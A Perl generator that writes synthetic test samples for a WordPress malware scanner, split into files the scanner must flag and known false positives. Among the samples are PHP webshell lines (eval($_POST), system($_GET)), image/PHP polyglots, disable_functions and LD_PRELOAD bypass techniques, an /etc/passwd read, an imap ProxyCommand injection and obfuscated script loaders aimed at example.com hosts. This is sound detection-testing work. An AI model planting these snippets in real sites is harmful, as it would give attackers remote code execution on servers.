#!/usr/bin/perl
# Generator for tests/samples: synthetic, harmless samples (only *.example.com
# domains, nothing is ever executed). Add a sample here, then:
#   perl tests/make-samples.pl tests/samples && bash tests/run.sh --update
# and review the expected.txt diff line by line before committing.
use strict; use warnings; use MIME::Base64; use File::Path qw(make_path); use File::Basename;
my $D = shift or die "usage: $0 DIR\n";
sub w { my ($p, $c) = @_; my $f = "$D/$p"; make_path(dirname($f));
        open my $h, '>', $f or die "$f: $!"; print $h $c; close $h }
sub hex_esc { join '', map { sprintf '\\x%02x', ord } split //, shift }
sub shift_s { my ($s, $n) = @_; join '', map { chr(ord($_) + $n) } split //, $s }
sub codes   { join ',', map { ord } split //, shift }
sub pct     { join '', map { sprintf '%%%02x', ord } split //, shift }

my $H = "/* fixed-malscan test sample - synthetic, harmless (example.com only) */\n";
my $P = "<?php\n// fixed-malscan test sample - synthetic, harmless (example.com only)\n";

# ---------------- must be flagged ----------------
w('malicious/js/shifted-url.js', $H .
  'var s="' . shift_s('https://shift.example.com/x.js', 5) . '",o="";' .
  'for(var i=0;i<s.length;i++)o+=String.fromCharCode(s.charCodeAt(i)-5);' . "\n");
w('malicious/js/fromcharcode-long.js', $H .
  'document.write(String.fromCharCode(' . codes('<script src="https://fcc.example.com/a.js"></script>') . "));\n");
w('malicious/js/fromcharcode-short.js', $H .
  'var k=String.fromCharCode(' . codes('cookie=1') . ");\n");
w('malicious/js/hex-http.js', $H .
  'var u="' . hex_esc('https') . '://hex.example.com/p.js";' . "\n");
w('malicious/js/eval-atob.js', $H .
  "eval(atob('" . encode_base64('document.write("<script src=//b64.example.com/a.js></script>")', '') . "'));\n");
w('malicious/js/unescape-blob.js', $H .
  "document.write(unescape('" . pct('<script src="//pct.example.com/a.js"></script>') . "'));\n");
w('malicious/js/packer.js', $H .
  "eval(function(p,a,c,k,e,d){e=function(c){return c};return p}('0 1',2,2,'var|x'.split('|'),0,{}))\n");
w('malicious/js/obfuscator.js', $H .
  "var _0x1a2b3c=['log'];(function(_0x4d5e6f,_0x7a8b9c){_0x4d5e6f[_0x7a8b9c]})(_0x1a2b3c,_0x2b3c4d);\n");
w('malicious/php/eval-chain.php', $P .
  "eval(gzinflate(base64_decode('" . encode_base64('placeholder payload, not compressed', '') . "')));\n");
w('malicious/php/hex-varvar.php', $P .
  '${"' . hex_esc('GLOBALS') . '"}["a"] = "b";' . "\n");
w('malicious/php/char-assembly.php', $P .
  '$f = $t["k"][77].$t["k"][40].$t["k"][12].$t["k"][3];' . "\n");
w('malicious/php/input-exec.php', $P . 'eval($_POST["c"]);' . "\n");
w('malicious/php/webshell-marker.php', $P . '$auth = "FilesMan";' . "\n");
w('malicious/php/hex-blob.php', $P .
  '$a = "' . hex_esc('eval(base64_decode($_POST["cmd"]));//pad') . '";' . "\n");
w('malicious/php/hex-blob-one-repeat.php', $P .
  '$t = "' . hex_esc(' eiasntroludcmpgfbhvyqwkxjzEIASNTROLUe') . '";' . "\n");
w('malicious/php/hex-blob-table-plus-injection.php', $P .
  '$t = "' . hex_esc(' eiasntroludcmpgfbhvyqwkxjzEIASNTROLUD') . '";' . "\n" .
  '$a = "' . hex_esc('eval(base64_decode($_POST["cmd"]));//pad') . '";' . "\n");
w('malicious/php/b64url-variable.php', $P .
  '$u = \'' . encode_base64('https://b64url.example.com/payload.txt', '') . "';\n" .
  'echo file_get_contents(base64_decode($u));' . "\n");
(my $safe = encode_base64('https://b64safe.example.com/??>>x.js', '')) =~ tr{+/}{-_};
w('malicious/js/b64url-urlsafe.js', $H .
  'var u="' . $safe . '";var s=document.createElement("script");s.src=atob(u.replace(/-/g,"+").replace(/_/g,"/"));' . "\n");
w('malicious/js/b64url-http.js', $H .
  "var cfg={src:'" . encode_base64('http://b64http.example.com/i.js', '') . "'};\n");
# look-alikes of the content (rate_/classify_) FP rules: must still be reported
w('malicious/php/char-assembly-almost-sequence.php', $P .
  '$f = $t[10].$t[11].$t[12].$t[14];' . "\n");
w('malicious/php/b64-gif-with-php.php', $P .
  "\$x = base64_decode('" . encode_base64('GIF89a<?php eval($_POST[1]); ?>', '') . "');\n");
w('malicious/php/b64-function-name.php', $P .
  "\$f = base64_decode('" . encode_base64('file_put_contents', '') . "');\n");
w('backups/shell.php.dist', "<?php eval(\$_POST['c']); ?>\n");
my $arith = 'function a(t){return t.charCodeAt(0)-48}' .
  'function b(c){return c.charCodeAt(0)-"A".charCodeAt(0)+10}' .
  'function c(t,s){return t[s].charCodeAt(1)+1===t[s+1].charCodeAt(1)}' .
  'function d(o){return 95===o.id.charCodeAt(o.id.lastIndexOf("/")+1)}' .
  'function e(t,i){for(var n=t[i-1].charCodeAt(0)+1,r=t[i+1].charCodeAt(0)-1,a=n,d=[];a<=r;)d.push(String.fromCharCode(a)),a++;return d}';
w('malicious/js/shift-via-variable.js', $H .
  'var s="x",o="";for(var i=0;i<s.length;i++){var c=s.charCodeAt(i)-5;o+=String.fromCharCode(c)}' . "\n");
w('malicious/js/shift-one-via-variable.js', $H .
  'var s="x",o="";for(var i=0;i<s.length;i++){var c=s[i].charCodeAt(0)-1;o+=String.fromCharCode(c)}' . "\n");
w('malicious/js/char-maths-plus-shift.js', $H . $arith . "\n" .
  'var s="x",o="";for(var i=0;i<s.length;i++){var c=s.charCodeAt(i)^7;o+=String.fromCharCode(c)}' . "\n");
# path-allowlist blind-spot tests: injection in/next to an allowlisted file
my $reveal = 'const d=e=>{try{e=decodeURIComponent(e);let t="";for(let r=0;r<e.length;r++)'
           . 't+=String.fromCharCode(e.charCodeAt(r)-1);return atob(t)}catch(t){return e}};';
w('wp-content/plugins/superb-blocks/assets/js/injected.js', $H .
  'var s="' . shift_s('https://superb.example.com/x.js', 5) . '",o="";' .
  'for(var i=0;i<s.length;i++)o+=String.fromCharCode(s.charCodeAt(i)-5);' . "\n");
w('wp-content/plugins/superb-blocks/assets/js/dynamic-blocks/reveal-button.js', $H . $reveal . "\n" .
  'var s="' . shift_s('https://reveal.example.com/x.js', 5) . "\";\n");
w('wp-content/uploads/2026/10/cache.php', $P . 'echo "uploaded code";' . "\n");
w('backups/wp-config.php.bak', $P . "define('DB_USER', 'x'); define('DB_PASSWORD', 'x');\n");
w('backups/wp-config-old.txt', "no credentials here\n");
w('backups/old.php.bak', $P . "echo 1;\n");
w('backups/empty.php.bak', '');

# FAKE_IMAGE: image extension, not image data (or image + PHP appended)
my $jpg = "\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" . ("\x00" x 64) . "\xff\xd9";
my $png = "\x89PNG\r\n\x1a\n\x00\x00\x00\x0dIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
        . "\x00\x00\x00\x00IEND\xaeB`\x82";
w('wp-content/uploads/2026/10/logo_s.jpg', $P . 'echo file_get_contents("https://api.example.com/page");' . "\n");
w('wp-content/uploads/2026/10/banner_s.jpg', "<!DOCTYPE html>\n<html><head><title>doorway.example.com</title></head><body>x</body></html>\n");
w('wp-content/uploads/2026/10/short-tag.png', '<?= "x" ?>' . "\n");
w('wp-content/uploads/2026/10/polyglot.jpg', $jpg . '<?php eval($_POST["c"]); ?>');
w('wp-content/uploads/2026/10/polyglot-gif.gif', "GIF89a\x01\x00\x01\x00\x00\x00\x00;" . "<?php echo 1; ?>\n");
w('wp-content/uploads/2026/10/empty.png', '');
# SVG renamed .png: quiet when plain (legit/img), flagged with active content
my $svg = qq{<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 8 8">};
w('wp-content/uploads/2026/10/svg-script.png', $svg . '<path d="M0 0h8v8z"/><script>location="https://svg.example.com/"</script></svg>' . "\n");
w('wp-content/uploads/2026/10/svg-onload.png', '<svg onload="location=1" xmlns="http://www.w3.org/2000/svg"></svg>' . "\n");
w('wp-content/uploads/2026/10/svg-link.png', $svg . '<a xlink:href="https://spam.example.com/"><text>x</text></a></svg>' . "\n");
# PHP appended after a big image: only found by the tail read (head = 256 KB)
w('wp-content/uploads/2026/10/appended-big.jpg', $jpg . ("\x00" x 400000) . '<?php echo 1; ?>');
# PHP in EXIF/comment block right after the JPEG header
w('wp-content/uploads/2026/10/exif-php.jpg', "\xff\xd8\xff\xfe\x00\x1c<?php system(\$_GET[1]); ?>" . ("\x00" x 400000) . "\xff\xd9");

# WEBSHELL_TECHNIQUES / PHP_SPLIT_STRING / PHP_CHR_LIST (index2.php family)
w('malicious/php/tech-ld-preload.php', $P . 'putenv("LD_PRELOAD=/tmp/x.so"); mail("a@example.com", "", "");' . "\n");
w('malicious/php/tech-so-source.php', $P . '$c = "void __attribute__((constructor)) i(){}";' . "\n" .
  '$cmd = "gcc -fPIC -shared -o /tmp/x.so /tmp/x.c";' . "\n");
w('malicious/php/tech-ffi.php', $P . '$f = FFI::cdef("int system(const char *c);"); $f->system("id");' . "\n");
w('malicious/php/tech-pcntl.php', $P . 'pcntl_exec("/bin/sh", array("-c", "id"));' . "\n");
w('malicious/php/tech-etc-passwd.php', $P . '$u = @file_get_contents(\'/etc/passwd\');' . "\n");
w('malicious/php/tech-user-ini.php', $P . '@file_put_contents(".user.ini", "open_basedir = /\n");' . "\n");
w('malicious/php/tech-imap.php', $P . 'imap_open("{x.example.com:143/imap}INBOX -oProxyCommand=x", "", "");' . "\n");
# ROOT_PHP_UNKNOWN: two tiny WP roots (wp-settings.php + wp-includes/)
for my $r ('wproot', 'wproot2') {
  w("$r/wp-settings.php", $P); w("$r/wp-includes/version.php", $P);
  w("$r/index.php", $P); w("$r/wp-login.php", $P); w("$r/wp-content/index.php", $P);
}
w('wproot/index2.php', $P . 'echo "planted file";' . "\n");
w('wproot/wp-confg.php', $P . 'echo "core look-alike name";' . "\n");
w('wproot/wp-content/hidden.php', $P . 'echo "planted in wp-content";' . "\n");
my $wfwaf = "<?php\n// Before removing this file, please verify the PHP ini setting `auto_prepend_file` does not point to this.\n\n"
  . "if (file_exists(__DIR__.'/wp-content/plugins/wordfence/waf/bootstrap.php')) {\n"
  . "\tdefine(\"WFWAF_LOG_PATH\", __DIR__.'/wp-content/wflogs/');\n"
  . "\tinclude_once __DIR__.'/wp-content/plugins/wordfence/waf/bootstrap.php';\n}\n";
w('wproot/wordfence-waf.php', $wfwaf);
w('wproot2/wordfence-waf.php', $wfwaf . '@include "/tmp/.x";' . "\n");

# ---------------- known false positives: must stay quiet/ignored ----------------
w('legit/php/hex-lookup-table.php', $P .
  'static $ASCII = "' . hex_esc(' eiasntroludcmpgfbhvyqwkxjzEIASNTROLUD') . '";' . "\n");
w('legit/php/sodium-binary-constants.php', $P .
  '$k = "\xed\xd3\xf5\x5c\x1a\x63\x12\x58\xd6\x9c\xf7\xa2\xde\xf9\xde\x14\x00\x00\x00\x00";' . "\n");
w('legit/php/base64-variable.php', $P . '$d = base64_decode($input);' . "\n");
w('legit/js/svg-data-uri.js', $H .
  'var icon="data:image/svg+xml;base64,' .
  encode_base64('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"></svg>', '') . "\";\n");
w('legit/php/b64-scheme-only.php', $P . '$p = \'aHR0cHM6Ly8=\';' . "\n");
w('legit/php/array-copy-in-order.php', $P .
  '$col = "6" . $sh["col"][1] . $sh["col"][2] . $sh["col"][3] . $sh["col"][4] . chr(100);' . "\n");
w('legit/php/tracking-pixel.php', $P .
  "echo base64_decode('R0lGODlhAQABAJAAAP8AAAAAACH5BAUQAAAALAAAAAABAAEAAAICBAEAOw==');\n");
w('legit/php/api-client-id.php', $P .
  "\$id = base64_decode('" . encode_base64('k3x9q2mzt7w4p8v', '') . "');\n");
w('legit/php/Template.php.in', $P . "class Example_Template { public \$name = 'Template'; }\n");
w('legit/php/.php_cs.dist', $P . "return PhpCsFixer\\Config::create()->setRules(['\@PSR2' => true]);\n");
w('legit/php/helper.php_example', $P . "/* Plugin Name: Example Helper */\nadd_filter('x', '__return_true');\n");
w('legit/js/char-maths.js', $H . $arith . "\n");
w('legit/js/rot13.js', $H .
  'function rot13(s){return s.replace(/[a-z]/gi,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26)})}' . "\n");
w('legit/js/luhn.js', $H .
  'function v(n){var s=0;for(var i=0;i<n.length;i++){s+=n.charCodeAt(i)-48}return s%10==0}' . "\n");
w('wp-content/plugins/superb-helper-pro/assets/js/premium/premium-reveal-button.js', $H . $reveal . "\n");
w('wp-content/uploads/placeholder/index.php', "<?php\n// Silence is golden.\n");
w('backups/saved-page.php@id=1.htm', "<!doctype html><html><body>saved page</body></html>\n");
w('legit/img/real.jpg', $jpg);
w('legit/img/real.png', $png);
w('legit/img/real.gif', "GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;");
w('legit/img/favicon.ico', "\x00\x00\x01\x00\x01\x00\x01\x01\x00\x00\x01\x00\x20\x00" . ("\x00" x 48));
w('legit/img/real.webp', "RIFF\x1a\x00\x00\x00WEBPVP8L\x0d\x00\x00\x00\x2f\x00\x00\x00\x10\x07\x10\x11\x11\x88\x88\xfe\x07\x00");
w('legit/img/png-named-jpg.jpg', $png);
w('legit/img/short-tag-bytes.jpg', $jpg . "\x10<?=\x7f" . $jpg);
w('legit/img/svg-named-png.png', '<svg preserveAspectRatio="none" width="100%" height="100%" overflow="visible" style="display:block" viewBox="0 0 8 8" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h8v8z" fill="#123"/></svg>' . "\n");
w('legit/img/svg-embedded-png.png', $svg . '<image xlink:href="data:image/png;base64,iVBORw0KGgo=" width="8" height="8"/></svg>' . "\n");
w('legit/php/ini-get-limits.php', $P . '$d = ini_get(\'disable_functions\'); $o = ini_get(\'open_basedir\');' . "\n" .
  'echo "open_basedir = /home/user:/tmp is set";' . "\n");
w('legit/php/etc-passwd-blocklist.php', $P . '$block = array(\'/etc/passwd\', \'../\', \'php://\');' . "\n");
w('legit/php/ld-library-path.php', $P . 'putenv("LD_LIBRARY_PATH=/usr/lib"); putenv("TMPDIR=/tmp");' . "\n");
w('wproot/wp-content/object-cache.php', $P . '// drop-in' . "\n");
w('wproot/wp-config.php', $P . '// config' . "\n");
w('legit/php/ini-message.php', $P . '$e = __(\'%1$sopen_basedir%3$s restriction in effect:%4$sopen_basedir = "%5$s"%3$s\'); $f = "disable_functions = \"$df\"";' . "\n");
w('malicious/php/tech-php-ini-empty.php', $P . 'file_put_contents("php.ini", "disable_functions =\nsafe_mode = Off\n");' . "\n");
